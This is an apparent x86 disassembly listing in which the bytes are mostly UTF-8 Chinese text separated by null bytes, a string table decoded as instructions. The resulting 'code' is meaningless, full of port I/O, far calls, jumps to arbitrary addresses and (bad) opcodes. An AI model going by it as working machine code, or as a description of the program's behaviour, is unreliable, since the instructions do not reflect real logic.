  406a12:	b0 87                	mov    $0x87,%al
  406a14:	e5 a5                	in     $0xa5,%eax
  406a16:	b9 e6 88 90 e9       	mov    $0xe99088e6,%ecx
  406a1b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406a1c:	96                   	xchg   %eax,%esi
  406a1d:	e5 9f                	in     $0x9f,%eax
  406a1f:	b7 e4                	mov    $0xe4,%bh
  406a21:	ba ba e4 ba ba       	mov    $0xbabae4ba,%edx
  406a26:	00 e6                	add    %ah,%dh
  406a28:	b3 95                	mov    $0x95,%bl
  406a2a:	e7 9a                	out    %eax,$0x9a
  406a2c:	84 e7                	test   %ah,%bh
  406a2e:	9a 84 e5 8f 97 e5 8f 	lcall  $0x8fe5,$0x978fe584
  406a35:	b8 e4 ba ba 00       	mov    $0xbabae4,%eax
  406a3a:	e4 bd                	in     $0xbd,%al
  406a3c:	bf e7 8e 89 e7       	mov    $0xe7898ee7,%edi
  406a41:	9a 84 e6 88 90 e5 ad 	lcall  $0xade5,$0x9088e684
  406a48:	ab                   	stos   %eax,%es:(%edi)
  406a49:	e5 b0                	in     $0xb0,%eax
  406a4b:	87 e5                	xchg   %esp,%ebp
  406a4d:	b0 87                	mov    $0x87,%al
  406a4f:	e7 9a                	out    %eax,$0x9a
  406a51:	84 e5                	test   %ah,%ch
  406a53:	95                   	xchg   %eax,%ebp
  406a54:	86 e4                	xchg   %ah,%ah
  406a56:	ba ba 00 e5 a5       	mov    $0xa5e500ba,%edx
  406a5b:	b9 e6 98 af e6       	mov    $0xe6af98e6,%ecx
  406a60:	b3 95                	mov    $0x95,%bl
  406a62:	e6 95                	out    %al,$0x95
  406a64:	ac                   	lods   %ds:(%esi),%al
  406a65:	e6 88                	out    %al,$0x88
  406a67:	90                   	nop
  406a68:	e5 ad                	in     $0xad,%eax
  406a6a:	ab                   	stos   %eax,%es:(%edi)
  406a6b:	e4 ba                	in     $0xba,%al
  406a6d:	ba 00 e7 94 9f       	mov    $0x9f94e700,%edx
  406a72:	e5 b8                	in     $0xb8,%eax
  406a74:	8c e4                	mov    %fs,%esp
  406a76:	bd bf e5 a5 b9       	mov    $0xb9a5e5bf,%ebp
  406a7b:	e5 90                	in     $0x90,%eax
  406a7d:	88 e7                	mov    %ah,%bh
  406a7f:	a8 8b                	test   $0x8b,%al
  406a81:	e5 b8                	in     $0xb8,%eax
  406a83:	ad                   	lods   %ds:(%esi),%eax
  406a84:	e6 be                	out    %al,$0xbe
  406a86:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406a87:	e6 88                	out    %al,$0x88
  406a89:	90                   	nop
  406a8a:	e5 ae                	in     $0xae,%eax
  406a8c:	b6 e5                	mov    $0xe5,%dh
  406a8e:	8f                   	(bad)
  406a8f:	97                   	xchg   %eax,%edi
  406a90:	e6 b3                	out    %al,$0xb3
  406a92:	95                   	xchg   %eax,%ebp
  406a93:	e4 ba                	in     $0xba,%al
  406a95:	ba 00 e5 ae 98       	mov    $0x98aee500,%edx
  406a9a:	e7 9a                	out    %eax,$0x9a
  406a9c:	84 e5                	test   %ah,%ch
  406a9e:	8f                   	(bad)
  406a9f:	b8 e5 a5 b9 e6       	mov    $0xe6b9a5e5,%eax
  406aa4:	98                   	cwtl
  406aa5:	af                   	scas   %es:(%edi),%eax
  406aa6:	e5 b8                	in     $0xb8,%eax
  406aa8:	ad                   	lods   %ds:(%esi),%eax
  406aa9:	e6 be                	out    %al,$0xbe
  406aab:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406aac:	e5 8f                	in     $0x8f,%eax
  406aae:	97                   	xchg   %eax,%edi
  406aaf:	e6 8e                	out    %al,$0x8e
  406ab1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406ab2:	e6 88                	out    %al,$0x88
  406ab4:	90                   	nop
  406ab5:	e7 94                	out    %eax,$0x94
  406ab7:	9f                   	lahf
  406ab8:	e4 ba                	in     $0xba,%al
  406aba:	ba 00 e5 9f b7       	mov    $0xb79fe500,%edx
  406abf:	e5 8f                	in     $0x8f,%eax
  406ac1:	b8 e5 ad ab e4       	mov    $0xe4abade5,%eax
  406ac6:	ba ba e6 b3 95       	mov    $0x95b3e6ba,%edx
  406acb:	e7 9a                	out    %eax,$0x9a
  406acd:	84 e4                	test   %ah,%ah
  406acf:	ba ba 00 e7 b9       	mov    $0xb9e700ba,%edx
  406ad4:	bc e5 b0 8a e7       	mov    $0xe78ab0e5,%esp
  406ad9:	9a 84 e7 9a 84 e4 ba 	lcall  $0xbae4,$0x849ae784
  406ae0:	ba 00 e6 88 90       	mov    $0x9088e600,%edx
  406ae5:	e9 a1 a7 e7 9a       	jmp    0x9b28128b
  406aea:	84 e8                	test   %ch,%al
  406aec:	a1 8c e5 b8 ad       	mov    0xadb8e58c,%eax
  406af1:	e7 ae                	out    %eax,$0xae
  406af3:	a1 e7 9a 84 e9       	mov    0xe9849ae7,%eax
  406af8:	a1 a7 e5 90 88       	mov    0x8890e5a7,%eax
  406afd:	e7 9a                	out    %eax,$0x9a
  406aff:	84 e7                	test   %ah,%bh
  406b01:	ae                   	scas   %es:(%edi),%al
  406b02:	a1 e9 a1 a7 e8       	mov    0xe8a7a1e9,%eax
  406b07:	a1 8c e4 ba ba       	mov    0xbabae48c,%eax
  406b0c:	00 e6                	add    %ah,%dh
  406b0e:	88 90 e6 be a4 e5    	mov    %dl,-0x1a5b411a(%eax)
  406b14:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406b15:	aa                   	stos   %al,%es:(%edi)
  406b16:	e9 87 91 e4 ba       	jmp    0xbb24fca2
  406b1b:	ba 00 e5 ae b6       	mov    $0xb6aee500,%edx
  406b20:	e5 b8                	in     $0xb8,%eax
  406b22:	ad                   	lods   %ds:(%esi),%eax
  406b23:	e7 b9                	out    %eax,$0xb9
  406b25:	bc e5 ae b6 e7       	mov    $0xe7b6aee5,%esp
  406b2a:	9a 84 e9 a1 a7 e4 ba 	lcall  $0xbae4,$0xa7a1e984
  406b31:	ba 00 e4 ba ba       	mov    $0xbabae400,%edx
  406b36:	e6 be                	out    %al,$0xbe
  406b38:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406b39:	e7 94                	out    %eax,$0x94
  406b3b:	9f                   	lahf
  406b3c:	e6 98                	out    %al,$0x98
  406b3e:	af                   	scas   %es:(%edi),%eax
  406b3f:	e5 9f                	in     $0x9f,%eax
  406b41:	b7 e6                	mov    $0xe6,%bh
  406b43:	be a4 e5 9f b7       	mov    $0xb79fe5a4,%esi
  406b48:	e4 bd                	in     $0xbd,%al
  406b4a:	bf 00 e9 a1 a7       	mov    $0xa7a1e900,%edi
  406b4f:	e5 a4                	in     $0xa4,%eax
  406b51:	aa                   	stos   %al,%es:(%edi)
  406b52:	e7 82                	out    %eax,$0x82
  406b54:	ba e9 a1 a7 e5       	mov    $0xe5a7a1e9,%edx
  406b59:	90                   	nop
  406b5a:	88 e5                	mov    %ah,%ch
  406b5c:	9f                   	lahf
  406b5d:	8e e7                	mov    %edi,%fs
  406b5f:	ae                   	scas   %es:(%edi),%al
  406b60:	a1 e6 88 90 e5       	mov    0xe59088e6,%eax
  406b65:	b8 ad e4 bd bf       	mov    $0xbfbde4ad,%eax
  406b6a:	00 e7                	add    %ah,%bh
  406b6c:	9a 84 e5 bc 95 e7 a8 	lcall  $0xa8e7,$0x95bce584
  406b73:	8b e5                	mov    %ebp,%esp
  406b75:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406b76:	aa                   	stos   %al,%es:(%edi)
  406b77:	e7 8e                	out    %eax,$0x8e
  406b79:	89 e5                	mov    %esp,%ebp
  406b7b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406b7c:	b9 e6 be a4 e4       	mov    $0xe4a4bee6,%ecx
  406b81:	bd bf 00 e7 82       	mov    $0x82e700bf,%ebp
  406b86:	ba e5 ad 90 e6       	mov    $0xe690ade5,%edx
  406b8b:	88 90 e5 ae b6 e6    	mov    %dl,-0x1949511b(%eax)
  406b91:	95                   	xchg   %eax,%ebp
  406b92:	ac                   	lods   %ds:(%esi),%al
  406b93:	e7 82                	out    %eax,$0x82
  406b95:	ba e5 b8 ad e5       	mov    $0xe5adb8e5,%edx
  406b9a:	b8 8c e7 94 9f       	mov    $0x9f94e78c,%eax
  406b9f:	e7 9a                	out    %eax,$0x9a
  406ba1:	84 e5                	test   %ah,%ch
  406ba3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406ba4:	b9 e9 a1 a7 e4       	mov    $0xe4a7a1e9,%ecx
  406ba9:	bd bf 00 e5 8f       	mov    $0x8fe500bf,%ebp
  406bae:	97                   	xchg   %eax,%edi
  406baf:	e7 82                	out    %eax,$0x82
  406bb1:	ba e5 91 bd e4       	mov    $0xe4bd91e5,%edx
  406bb6:	ba ba e7 9a 84       	mov    $0x849ae7ba,%edx
  406bbb:	e5 a5                	in     $0xa5,%eax
  406bbd:	b9 e7 8e 89 e5       	mov    $0xe5898ee7,%ecx
  406bc2:	ae                   	scas   %es:(%edi),%al
  406bc3:	b6 e5                	mov    $0xe5,%dh
  406bc5:	9f                   	lahf
  406bc6:	b7 e5                	mov    $0xe5,%bh
  406bc8:	85 ac 00 e7 b9 bc e9 	test   %ebp,-0x16434619(%eax,%eax,1)
  406bcf:	a1 a7 e5 a4 aa       	mov    0xaaa4e5a7,%eax
  406bd4:	e5 bc                	in     $0xbc,%eax
  406bd6:	95                   	xchg   %eax,%ebp
  406bd7:	e7 9a                	out    %eax,$0x9a
  406bd9:	84 e7                	test   %ah,%bh
  406bdb:	9a 84 e5 85 ac 00 e4 	lcall  $0xe400,$0xac85e584
  406be2:	ba ba e7 94 9f       	mov    $0x9f94e7ba,%edx
  406be7:	e5 85                	in     $0x85,%eax
  406be9:	ac                   	lods   %ds:(%esi),%al
  406bea:	e5 8f                	in     $0x8f,%eax
  406bec:	97                   	xchg   %eax,%edi
  406bed:	e5 8f                	in     $0x8f,%eax
  406bef:	97                   	xchg   %eax,%edi
  406bf0:	00 e5                	add    %ah,%ch
  406bf2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406bf3:	aa                   	stos   %al,%es:(%edi)
  406bf4:	e7 9a                	out    %eax,$0x9a
  406bf6:	84 e7                	test   %ah,%bh
  406bf8:	a8 8b                	test   $0x8b,%al
  406bfa:	e5 91                	in     $0x91,%eax
  406bfc:	bd e7 9a 84 e7       	mov    $0xe7849ae7,%ebp
  406c01:	9a 84 e7 82 ba e5 8f 	lcall  $0x8fe5,$0xba82e784
  406c08:	b8 e4 ba ba e7       	mov    $0xe7babae4,%eax
  406c0d:	b9 bc e7 9a 84       	mov    $0x849ae7bc,%ecx
  406c12:	e9 a1 a7 e6 98       	jmp    0x992713b8
  406c17:	af                   	scas   %es:(%edi),%eax
  406c18:	e5 8f                	in     $0x8f,%eax
  406c1a:	97                   	xchg   %eax,%edi
  406c1b:	00 e5                	add    %ah,%ch
  406c1d:	9f                   	lahf
  406c1e:	8e e6                	mov    %esi,%fs
  406c20:	88 90 e5 b0 8e e6    	mov    %dl,-0x19714f1b(%eax)
  406c26:	b3 95                	mov    $0x95,%bl
  406c28:	e6 89                	out    %al,$0x89
  406c2a:	bf e5 8f b8 e6       	mov    $0xe6b88fe5,%edi
  406c2f:	8e a5 e5 bc 95 e9    	mov    -0x166a431b(%ebp),%fs
  406c35:	a1 a7 e7 ae a1       	mov    0xa1aee7a7,%eax
  406c3a:	e5 8f                	in     $0x8f,%eax
  406c3c:	97                   	xchg   %eax,%edi
  406c3d:	00 e7                	add    %ah,%bh
  406c3f:	8e 89 e4 bd bf e6    	mov    -0x1940421c(%ecx),%cs
  406c45:	8e a5 e7 94 9f e5    	mov    -0x1a606b19(%ebp),%fs
  406c4b:	85 ac e7 9a 84 e7 9a 	test   %ebp,-0x65187b66(%edi,%eiz,8)
  406c52:	84 e5                	test   %ah,%ch
  406c54:	ad                   	lods   %ds:(%esi),%eax
  406c55:	90                   	nop
  406c56:	e5 8f                	in     $0x8f,%eax
  406c58:	b8 00 e7 a8 8b       	mov    $0x8ba8e700,%eax
  406c5d:	e9 a1 a7 e5 91       	jmp    0x92261403
  406c62:	bd e5 91 bd e5       	mov    $0xe5bd91e5,%ebp
  406c67:	bc 95 e9 a6 96       	mov    $0x96a6e995,%esp
  406c6c:	e5 b8                	in     $0xb8,%eax
  406c6e:	ad                   	lods   %ds:(%esi),%eax
  406c6f:	e6 88                	out    %al,$0x88
  406c71:	90                   	nop
  406c72:	e6 98                	out    %al,$0x98
  406c74:	af                   	scas   %es:(%edi),%eax
  406c75:	e5 8f                	in     $0x8f,%eax
  406c77:	b8 00 e5 ad ab       	mov    $0xabade500,%eax
  406c7c:	e6 89                	out    %al,$0x89
  406c7e:	bf e5 9f b7 e7       	mov    $0xe7b79fe5,%edi
  406c83:	9a 84 e6 8e a5 e9 a1 	lcall  $0xa1e9,$0xa58ee684
  406c8a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406c8b:	e6 8e                	out    %al,$0x8e
  406c8d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406c8e:	e5 a4                	in     $0xa4,%eax
  406c90:	aa                   	stos   %al,%es:(%edi)
  406c91:	e5 90                	in     $0x90,%eax
  406c93:	88 00                	mov    %al,(%eax)
  406c95:	e6 8e                	out    %al,$0x8e
  406c97:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406c98:	e5 b0                	in     $0xb0,%eax
  406c9a:	87 e5                	xchg   %esp,%ebp
  406c9c:	9f                   	lahf
  406c9d:	8e e5                	mov    %ebp,%fs
  406c9f:	8f                   	(bad)
  406ca0:	97                   	xchg   %eax,%edi
  406ca1:	e7 a8                	out    %eax,$0xa8
  406ca3:	8b e5                	mov    %ebp,%esp
  406ca5:	90                   	nop
  406ca6:	88 00                	mov    %al,(%eax)
  406ca8:	e6 95                	out    %al,$0x95
  406caa:	ac                   	lods   %ds:(%esi),%al
  406cab:	e5 90                	in     $0x90,%eax
  406cad:	88 e5                	mov    %ah,%ch
  406caf:	9f                   	lahf
  406cb0:	8e e7                	mov    %edi,%fs
  406cb2:	a8 8b                	test   $0x8b,%al
  406cb4:	e8 a1 8c e5 90       	call   0x9125f95a
  406cb9:	88 00                	mov    %al,(%eax)
  406cbb:	e5 ad                	in     $0xad,%eax
  406cbd:	ab                   	stos   %eax,%es:(%edi)
  406cbe:	e4 bd                	in     $0xbd,%al
  406cc0:	bf e5 b0 87 e6       	mov    $0xe687b0e5,%edi
  406cc5:	98                   	cwtl
  406cc6:	af                   	scas   %es:(%edi),%eax
  406cc7:	e4 ba                	in     $0xba,%al
  406cc9:	ba e5 a4 aa e6       	mov    $0xe6aaa4e5,%edx
  406cce:	88 90 e7 8e 89 e6    	mov    %dl,-0x19767119(%eax)
  406cd4:	88 90 e9 a1 a7 e5    	mov    %dl,-0x1a585e17(%eax)
  406cda:	90                   	nop
  406cdb:	88 00                	mov    %al,(%eax)
  406cdd:	e6 98                	out    %al,$0x98
  406cdf:	af                   	scas   %es:(%edi),%eax
  406ce0:	e9 87 91 e6 be       	jmp    0xbf26fe6c
  406ce5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406ce6:	e5 9f                	in     $0x9f,%eax
  406ce8:	8e e4                	mov    %esp,%fs
  406cea:	ba ba e9 a1 a7       	mov    $0xa7a1e9ba,%edx
  406cef:	e5 9f                	in     $0x9f,%eax
  406cf1:	8e e5                	mov    %ebp,%fs
  406cf3:	91                   	xchg   %eax,%ecx
  406cf4:	bd e5 b8 ad e7       	mov    $0xe7adb8e5,%ebp
  406cf9:	ae                   	scas   %es:(%edi),%al
  406cfa:	a1 e6 95 ac e8       	mov    0xe8ac95e6,%eax
  406cff:	a1 8c e5 91 bd       	mov    0xbd91e58c,%eax
  406d04:	00 e5                	add    %ah,%ch
  406d06:	ad                   	lods   %ds:(%esi),%eax
  406d07:	ab                   	stos   %eax,%es:(%edi)
  406d08:	e7 94                	out    %eax,$0x94
  406d0a:	9f                   	lahf
  406d0b:	e6 95                	out    %al,$0x95
  406d0d:	ac                   	lods   %ds:(%esi),%al
  406d0e:	e4 ba                	in     $0xba,%al
  406d10:	ba e5 91 bd e5       	mov    $0xe5bd91e5,%edx
  406d15:	95                   	xchg   %eax,%ebp
  406d16:	86 00                	xchg   %al,(%eax)
  406d18:	e5 85                	in     $0x85,%eax
  406d1a:	ac                   	lods   %ds:(%esi),%al
  406d1b:	e5 91                	in     $0x91,%eax
  406d1d:	bd e7 82 ba e7       	mov    $0xe7ba82e7,%ebp
  406d22:	9a 84 e7 8e 89 e7 a8 	lcall  $0xa8e7,$0x898ee784
  406d29:	8b e5                	mov    %ebp,%esp
  406d2b:	95                   	xchg   %eax,%ebp
  406d2c:	86 00                	xchg   %al,(%eax)
  406d2e:	e7 82                	out    %eax,$0x82
  406d30:	ba e5 b0 8a e7       	mov    $0xe78ab0e5,%edx
  406d35:	9a 84 e9 a1 a7 e5 95 	lcall  $0x95e5,$0xa7a1e984
  406d3c:	86 00                	xchg   %al,(%eax)
  406d3e:	e5 9f                	in     $0x9f,%eax
  406d40:	8e e7                	mov    %edi,%fs
  406d42:	94                   	xchg   %eax,%esp
  406d43:	9f                   	lahf
  406d44:	e6 9c                	out    %al,$0x9c
  406d46:	9b                   	fwait
  406d47:	e7 9a                	out    %eax,$0x9a
  406d49:	84 e5                	test   %ah,%ch
  406d4b:	90                   	nop
  406d4c:	88 e5                	mov    %ah,%ch
  406d4e:	9f                   	lahf
  406d4f:	8e 00                	mov    (%eax),%es
  406d51:	e5 b8                	in     $0xb8,%eax
  406d53:	ad                   	lods   %ds:(%esi),%eax
  406d54:	e5 90                	in     $0x90,%eax
  406d56:	88 e4                	mov    %ah,%ah
  406d58:	ba ba e5 b0 8a       	mov    $0x8ab0e5ba,%edx
  406d5d:	e7 8e                	out    %eax,$0x8e
  406d5f:	89 e7                	mov    %esp,%edi
  406d61:	9a 84 e6 88 90 e5 b0 	lcall  $0xb0e5,$0x9088e684
  406d68:	8e e9                	mov    %ecx,%gs
  406d6a:	a1 a7 e5 9f 8e       	mov    0x8e9fe5a7,%eax
  406d6f:	e9 a6 96 e4 ba       	jmp    0xbb25041a
  406d74:	ba e5 9f b7 e5       	mov    $0xe5b79fe5,%edx
  406d79:	9f                   	lahf
  406d7a:	8e 00                	mov    (%eax),%es
  406d7c:	e5 8f                	in     $0x8f,%eax
  406d7e:	b8 e7 9a 84 e9       	mov    $0xe9849ae7,%eax
  406d83:	a1 a7 e9 a6 96       	mov    0x96a6e9a7,%eax
  406d88:	e5 ad                	in     $0xad,%eax
  406d8a:	90                   	nop
  406d8b:	e5 9f                	in     $0x9f,%eax
  406d8d:	8e 00                	mov    (%eax),%es
  406d8f:	e6 88                	out    %al,$0x88
  406d91:	90                   	nop
  406d92:	e6 8e                	out    %al,$0x8e
  406d94:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406d95:	e6 b3                	out    %al,$0xb3
  406d97:	95                   	xchg   %eax,%ebp
  406d98:	e7 9a                	out    %eax,$0x9a
  406d9a:	84 e4                	test   %ah,%ah
  406d9c:	bd bf e5 ae 98       	mov    $0x98aee5bf,%ebp
  406da1:	e5 9f                	in     $0x9f,%eax
  406da3:	8e 00                	mov    (%eax),%es
  406da5:	e6 b3                	out    %al,$0xb3
  406da7:	95                   	xchg   %eax,%ebp
  406da8:	e5 95                	in     $0x95,%eax
  406daa:	86 e9                	xchg   %ch,%cl
  406dac:	a1 a7 e8 a1 8c       	mov    0x8ca1e8a7,%eax
  406db1:	e7 9a                	out    %eax,$0x9a
  406db3:	84 e5                	test   %ah,%ch
  406db5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406db6:	b9 e5 b0 8a e9       	mov    $0xe98ab0e5,%ecx
  406dbb:	87 91 e7 a8 8b e7    	xchg   %edx,-0x18745719(%ecx)
  406dc1:	9a 84 e5 9f 8e 00 e7 	lcall  $0xe700,$0x8e9fe584
  406dc8:	94                   	xchg   %eax,%esp
  406dc9:	9f                   	lahf
  406dca:	e6 88                	out    %al,$0x88
  406dcc:	90                   	nop
  406dcd:	e7 9a                	out    %eax,$0x9a
  406dcf:	84 e9                	test   %ch,%cl
  406dd1:	a1 a7 e7 8e 89       	mov    0x898ee7a7,%eax
  406dd6:	e5 ae                	in     $0xae,%eax
  406dd8:	b6 e4                	mov    $0xe4,%dh
  406dda:	ba ba e5 90 88       	mov    $0x8890e5ba,%edx
  406ddf:	e9 a1 a7 e5 9f       	jmp    0xa0261585
  406de4:	8e 00                	mov    (%eax),%es
  406de6:	e5 95                	in     $0x95,%eax
  406de8:	86 e6                	xchg   %ah,%dh
  406dea:	9c                   	pushf
  406deb:	9b                   	fwait
  406dec:	e4 ba                	in     $0xba,%al
  406dee:	ba e4 ba ba e5       	mov    $0xe5babae4,%edx
  406df3:	9f                   	lahf
  406df4:	b7 00                	mov    $0x0,%bh
  406df6:	e5 a5                	in     $0xa5,%eax
  406df8:	b9 e7 b9 bc e5       	mov    $0xe5bcb9e7,%ecx
  406dfd:	95                   	xchg   %eax,%ebp
  406dfe:	86 e9                	xchg   %ch,%cl
  406e00:	87 91 e6 8e a5 e5    	xchg   %edx,-0x1a5a711a(%ecx)
  406e06:	b0 87                	mov    $0x87,%al
  406e08:	e7 9a                	out    %eax,$0x9a
  406e0a:	84 e5                	test   %ah,%ch
  406e0c:	95                   	xchg   %eax,%ebp
  406e0d:	86 e5                	xchg   %ah,%ch
  406e0f:	8f                   	(bad)
  406e10:	97                   	xchg   %eax,%edi
  406e11:	e7 9a                	out    %eax,$0x9a
  406e13:	84 e7                	test   %ah,%bh
  406e15:	ae                   	scas   %es:(%edi),%al
  406e16:	a1 e5 91 bd e5       	mov    0xe5bd91e5,%eax
  406e1b:	9f                   	lahf
  406e1c:	b7 00                	mov    $0x0,%bh
  406e1e:	e7 9a                	out    %eax,$0x9a
  406e20:	84 e8                	test   %ch,%al
  406e22:	a1 8c e5 91 bd       	mov    0xbd91e58c,%eax
  406e27:	e7 9a                	out    %eax,$0x9a
  406e29:	84 e7                	test   %ah,%bh
  406e2b:	9a 84 e5 b0 8a e6 be 	lcall  $0xbee6,$0x8ab0e584
  406e32:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406e33:	e9 87 91 e4 ba       	jmp    0xbb24ffbf
  406e38:	ba e6 8e a5 e5       	mov    $0xe5a58ee6,%edx
  406e3d:	9f                   	lahf
  406e3e:	b7 00                	mov    $0x0,%bh
  406e40:	e7 b9                	out    %eax,$0xb9
  406e42:	bc e7 9a 84 e5       	mov    $0xe5849ae7,%esp
  406e47:	bc 95 e7 ae a1       	mov    $0xa1aee795,%esp
  406e4c:	e5 a4                	in     $0xa4,%eax
  406e4e:	aa                   	stos   %al,%es:(%edi)
  406e4f:	e6 88                	out    %al,$0x88
  406e51:	90                   	nop
  406e52:	e9 a6 96 e6 95       	jmp    0x962704fd
  406e57:	ac                   	lods   %ds:(%esi),%al
  406e58:	e5 9f                	in     $0x9f,%eax
  406e5a:	b7 00                	mov    $0x0,%bh
  406e5c:	e7 b9                	out    %eax,$0xb9
  406e5e:	bc e5 b0 87 e5       	mov    $0xe587b0e5,%esp
  406e63:	ad                   	lods   %ds:(%esi),%eax
  406e64:	90                   	nop
  406e65:	e5 b8                	in     $0xb8,%eax
  406e67:	8c e9                	mov    %gs,%ecx
  406e69:	87 91 e5 9f b7 00    	xchg   %edx,0xb79fe5(%ecx)
  406e6f:	e5 8f                	in     $0x8f,%eax
  406e71:	97                   	xchg   %eax,%edi
  406e72:	e6 9c                	out    %al,$0x9c
  406e74:	9b                   	fwait
  406e75:	e7 8e                	out    %eax,$0x8e
  406e77:	89 e5                	mov    %esp,%ebp
  406e79:	9f                   	lahf
  406e7a:	b7 e4                	mov    $0xe4,%bh
  406e7c:	bd bf e9 a1 a7       	mov    $0xa7a1e9bf,%ebp
  406e81:	e7 8e                	out    %eax,$0x8e
  406e83:	89 e7                	mov    %esp,%edi
  406e85:	ae                   	scas   %es:(%edi),%al
  406e86:	a1 e7 9a 84 e9       	mov    0xe9849ae7,%eax
  406e8b:	87 91 e5 9f b7 00    	xchg   %edx,0xb79fe5(%ecx)
  406e91:	e5 b0                	in     $0xb0,%eax
  406e93:	87 e5                	xchg   %esp,%ebp
  406e95:	ad                   	lods   %ds:(%esi),%eax
  406e96:	90                   	nop
  406e97:	e5 b0                	in     $0xb0,%eax
  406e99:	8a e7                	mov    %bh,%ah
  406e9b:	82 ba e5 85 ac e5 91 	cmpb   $0x91,-0x1a537a1b(%edx)
  406ea2:	bd e5 a4 aa 00       	mov    $0xaaa4e5,%ebp
  406ea7:	e6 98                	out    %al,$0x98
  406ea9:	af                   	scas   %es:(%edi),%eax
  406eaa:	e5 ae                	in     $0xae,%eax
  406eac:	b6 e9                	mov    $0xe9,%dh
  406eae:	a1 a7 e9 a6 96       	mov    0x96a6e9a7,%eax
  406eb3:	e9 a6 96 e5 9f       	jmp    0xa026055e
  406eb8:	8e e5                	mov    %ebp,%fs
  406eba:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406ebb:	aa                   	stos   %al,%es:(%edi)
  406ebc:	00 e5                	add    %ah,%ch
  406ebe:	95                   	xchg   %eax,%ebp
  406ebf:	86 e7                	xchg   %ah,%bh
  406ec1:	9a 84 e7 9a 84 e5 8f 	lcall  $0x8fe5,$0x849ae784
  406ec8:	97                   	xchg   %eax,%edi
  406ec9:	e4 ba                	in     $0xba,%al
  406ecb:	ba e4 ba ba e5       	mov    $0xe5babae4,%edx
  406ed0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406ed1:	b9 00 e6 95 ac       	mov    $0xac95e600,%ecx
  406ed6:	e5 ae                	in     $0xae,%eax
  406ed8:	b6 e7                	mov    $0xe7,%dh
  406eda:	b9 bc e5 85 ac       	mov    $0xac85e5bc,%ecx
  406edf:	e6 8e                	out    %al,$0x8e
  406ee1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406ee2:	e7 b9                	out    %eax,$0xb9
  406ee4:	bc e5 a4 aa e5       	mov    $0xe5aaa4e5,%esp
  406ee9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406eea:	b9 e5 ae b6 e6       	mov    $0xe6b6aee5,%ecx
  406eef:	b3 95                	mov    $0x95,%bl
  406ef1:	e5 a4                	in     $0xa4,%eax
  406ef3:	aa                   	stos   %al,%es:(%edi)
  406ef4:	e5 a5                	in     $0xa5,%eax
  406ef6:	b9 00 e7 82 ba       	mov    $0xba82e700,%ecx
  406efb:	e5 9f                	in     $0x9f,%eax
  406efd:	8e e6                	mov    %esi,%fs
  406eff:	89 bf e5 b0 8e e6    	mov    %edi,-0x19714f1b(%edi)
  406f05:	be a4 e6 88 90       	mov    $0x9088e6a4,%esi
  406f0a:	e5 95                	in     $0x95,%eax
  406f0c:	86 e5                	xchg   %ah,%ch
  406f0e:	8f                   	(bad)
  406f0f:	97                   	xchg   %eax,%edi
  406f10:	e7 ae                	out    %eax,$0xae
  406f12:	a1 e5 95 86 e6       	mov    0xe68695e5,%eax
  406f17:	98                   	cwtl
  406f18:	af                   	scas   %es:(%edi),%eax
  406f19:	e6 98                	out    %al,$0x98
  406f1b:	af                   	scas   %es:(%edi),%eax
  406f1c:	e5 a5                	in     $0xa5,%eax
  406f1e:	b9 00 e5 8f 97       	mov    $0x978fe500,%ecx
  406f23:	e5 9f                	in     $0x9f,%eax
  406f25:	b7 e4                	mov    $0xe4,%bh
  406f27:	ba ba e5 b8 ad       	mov    $0xadb8e5ba,%edx
  406f2c:	e9 87 91 e5 85       	jmp    0x862600b8
  406f31:	ac                   	lods   %ds:(%esi),%al
  406f32:	e6 88                	out    %al,$0x88
  406f34:	90                   	nop
  406f35:	e7 82                	out    %eax,$0x82
  406f37:	ba e5 a5 b9 00       	mov    $0xb9a5e5,%edx
  406f3c:	e5 b0                	in     $0xb0,%eax
  406f3e:	8a e9                	mov    %cl,%ch
  406f40:	a1 a7 e5 ae 98       	mov    0x98aee5a7,%eax
  406f45:	e5 bc                	in     $0xbc,%eax
  406f47:	95                   	xchg   %eax,%ebp
  406f48:	e6 9c                	out    %al,$0x9c
  406f4a:	9b                   	fwait
  406f4b:	e5 ad                	in     $0xad,%eax
  406f4d:	ab                   	stos   %eax,%es:(%edi)
  406f4e:	e7 a8                	out    %eax,$0xa8
  406f50:	8b e8                	mov    %eax,%ebp
  406f52:	a1 8c e9 a1 a7       	mov    0xa7a1e98c,%eax
  406f57:	e9 a1 a7 e7 9a       	jmp    0x9b2816fd
  406f5c:	84 e5                	test   %ah,%ch
  406f5e:	95                   	xchg   %eax,%ebp
  406f5f:	86 e9                	xchg   %ch,%cl
  406f61:	a1 a7 e5 a5 b9       	mov    0xb9a5e5a7,%eax
  406f66:	00 e7                	add    %ah,%bh
  406f68:	9a 84 e8 a1 8c e6 be 	lcall  $0xbee6,$0x8ca1e884
  406f6f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406f70:	e5 ad                	in     $0xad,%eax
  406f72:	90                   	nop
  406f73:	e5 ad                	in     $0xad,%eax
  406f75:	90                   	nop
  406f76:	e7 82                	out    %eax,$0x82
  406f78:	ba e5 b0 87 e7       	mov    $0xe787b0e5,%edx
  406f7d:	9a 84 e5 a4 aa e6 88 	lcall  $0x88e6,$0xaaa4e584
  406f84:	90                   	nop
  406f85:	e9 a1 a7 e5 9f       	jmp    0xa026172b
  406f8a:	8e e5                	mov    %ebp,%fs
  406f8c:	95                   	xchg   %eax,%ebp
  406f8d:	86 e5                	xchg   %ah,%ch
  406f8f:	ad                   	lods   %ds:(%esi),%eax
  406f90:	90                   	nop
  406f91:	00 e6                	add    %ah,%dh
  406f93:	9c                   	pushf
